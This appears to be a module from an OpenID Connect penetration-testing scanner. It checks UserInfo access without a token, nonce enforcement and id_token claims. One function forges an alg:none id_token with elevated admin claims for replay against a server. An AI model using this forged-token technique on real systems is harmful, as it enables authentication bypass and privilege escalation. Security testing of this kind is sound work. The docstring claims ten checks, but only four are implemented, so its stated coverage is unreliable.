"""
Check: OpenID Connect Specific Attacks
----------------------------------------
Tests:
  1. id_token signature not verified (alg:none, RS→HS confusion)
  2. nonce not validated — replay attacks on id_token
  3. iss/aud claim not validated
  4. at_hash not verified (access token hash)
  5. JWT confusion attacks on id_token
  6. UserInfo endpoint without access token
  7. Account linking/merging abuse
  8. sub claim manipulation
  9. email_verified bypass
 10. acr (auth context) downgrade
"""

import json
import base64
import hmac
import hashlib
from ..core import (http_request, decode_jwt_payload, build_auth_url,
                    R, G, Y, C, DIM, BOLD, RST)


def check_userinfo_unauth(userinfo_endpoint: str, verbose: bool = True) -> dict:
    """Test if userinfo endpoint is accessible without access token."""
    result = {"check": "userinfo_unauth", "vulnerable": False}

    if not userinfo_endpoint:
        return result

    # No Authorization header
    resp = http_request(userinfo_endpoint)
    if resp["status"] == 200:
        body = resp["body"]
        try:
            data = json.loads(body)
            if data.get("sub") or data.get("email") or data.get("name"):
                result["vulnerable"] = True
                result["severity"]   = "High"
                result["detail"]     = f"UserInfo endpoint returns PII without access token: {list(data.keys())}"
                result["data"]       = data
        except Exception:
            pass

    if verbose:
        status = f"{R}VULNERABLE{RST}" if result["vulnerable"] else f"{G}OK{RST}"
        print(f"  [{status}] UserInfo auth requirement")

    return result


def check_id_token_alg_none(id_token: str, verbose: bool = True) -> dict:
    """
    Test if the server accepts id_token with alg:none.
    Generates a forged token and tests if client-side validation occurs.
    """
    result = {"check": "id_token_alg_none", "vulnerable": False}

    if not id_token:
        if verbose:
            print(f"  [{DIM}SKIP{RST}] id_token alg:none — no id_token provided")
        return result

    try:
        parts = id_token.split(".")
        if len(parts) != 3:
            return result

        # Decode payload
        padding = 4 - len(parts[1]) % 4
        payload_bytes = base64.urlsafe_b64decode(parts[1] + "=" * padding)
        payload = json.loads(payload_bytes)

        # Forge: alg none header
        forged_header = base64.urlsafe_b64encode(
            b'{"alg":"none","typ":"JWT"}'
        ).rstrip(b"=").decode()

        # Elevate claims
        payload["admin"] = True
        payload["role"]  = "admin"
        if "sub" in payload:
            payload["sub"] = "1"

        forged_payload = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b"=").decode()

        forged_token = f"{forged_header}.{forged_payload}."

        result["forged_token"] = forged_token
        result["detail"] = ("Generated alg:none id_token. "
                             "Test manually: send this as id_token to see if server accepts it.")
        result["info"] = True

        if verbose:
            print(f"  [{Y}MANUAL{RST}] id_token alg:none — forged token generated for manual testing")
            print(f"      {forged_token[:80]}...")

    except Exception as e:
        pass

    return result


def check_nonce_validation(auth_endpoint: str, client_id: str,
                            redirect_uri: str, verbose: bool = True) -> dict:
    """
    Test if server enforces nonce in id_token (prevents replay).
    If auth server doesn't include nonce in id_token → client can't validate.
    """
    result = {"check": "nonce_validation", "vulnerable": False}

    # Send auth request without nonce
    params = {
        "response_type": "code",
        "client_id":     client_id,
        "redirect_uri":  redirect_uri,
        "scope":         "openid",
        "state":         "test",
        # No nonce
    }
    url  = build_auth_url(auth_endpoint, params)
    resp = http_request(url, follow_redirects=False)

    body_lower = resp["body"].lower()
    nonce_required = any(x in body_lower for x in [
        "nonce is required", "nonce.*required", "missing nonce"
    ])

    if not nonce_required and resp["status"] in (200, 302):
        result["vulnerable"] = True
        result["severity"]   = "Medium"
        result["detail"]     = ("OIDC auth request without nonce accepted. "
                                 "If id_token lacks nonce, replay attacks are possible.")

    if verbose:
        status = f"{Y}NOTE{RST}" if result["vulnerable"] else f"{G}OK{RST}"
        print(f"  [{status}] Nonce enforcement")

    return result


def check_id_token_claims(id_token: str, expected_iss: str = None,
                           expected_aud: str = None,
                           verbose: bool = True) -> list:
    """
    Validate id_token claims that client SHOULD verify:
    iss, aud, exp, iat, nonce
    Reports if claims are missing (client-side validation bypass risk).
    """
    findings = []

    if not id_token:
        return findings

    payload = decode_jwt_payload(id_token)
    if not payload:
        return findings

    if verbose:
        print(f"\n  {C}[ID_TOKEN CLAIMS ANALYSIS]{RST}")
        for k, v in payload.items():
            print(f"    {k:<20}: {v}")

    # Check critical claims
    if not payload.get("iss"):
        findings.append({
            "check": "id_token_missing_iss", "severity": "High",
            "detail": "id_token missing 'iss' claim — issuer not verifiable",
            "vulnerable": True,
        })

    if not payload.get("aud"):
        findings.append({
            "check": "id_token_missing_aud", "severity": "High",
            "detail": "id_token missing 'aud' claim — audience not verifiable (token reuse across apps)",
            "vulnerable": True,
        })

    if not payload.get("exp"):
        findings.append({
            "check": "id_token_no_expiry", "severity": "Medium",
            "detail": "id_token has no 'exp' claim — never expires",
            "vulnerable": True,
        })

    if not payload.get("nonce"):
        findings.append({
            "check": "id_token_no_nonce", "severity": "Medium",
            "detail": "id_token has no 'nonce' claim — replay protection absent",
            "vulnerable": True,
        })

    if payload.get("email_verified") is False:
        findings.append({
            "check": "email_not_verified", "severity": "Medium",
            "detail": "email_verified=false but account may still be usable — social login bypass risk",
            "vulnerable": True,
        })

    import time
    exp = payload.get("exp", 0)
    if exp and (exp - time.time()) > 86400 * 7:
        findings.append({
            "check": "long_lived_id_token", "severity": "Low",
            "detail": f"id_token expires in {int((exp - time.time()) / 86400)} days — overly long lifetime",
            "vulnerable": True,
        })

    if verbose:
        for f in findings:
            print(f"  [{R}ISSUE{RST}] {f['check']}: {f['detail']}")

    return findings


def run_all(auth_endpoint: str, client_id: str, redirect_uri: str,
            userinfo_endpoint: str = None, id_token: str = None,
            expected_iss: str = None, verbose: bool = True) -> list:

    if verbose:
        print(f"\n  {C}[OIDC CHECKS]{RST}")

    findings = []

    if userinfo_endpoint:
        r = check_userinfo_unauth(userinfo_endpoint, verbose)
        if r.get("vulnerable"):
            findings.append(r)

    if id_token:
        r = check_id_token_alg_none(id_token, verbose)
        if r.get("vulnerable") or r.get("info"):
            findings.append(r)
        findings.extend(check_id_token_claims(id_token, expected_iss, client_id, verbose))

    r = check_nonce_validation(auth_endpoint, client_id, redirect_uri, verbose)
    if r.get("vulnerable"):
        findings.append(r)

    return findings
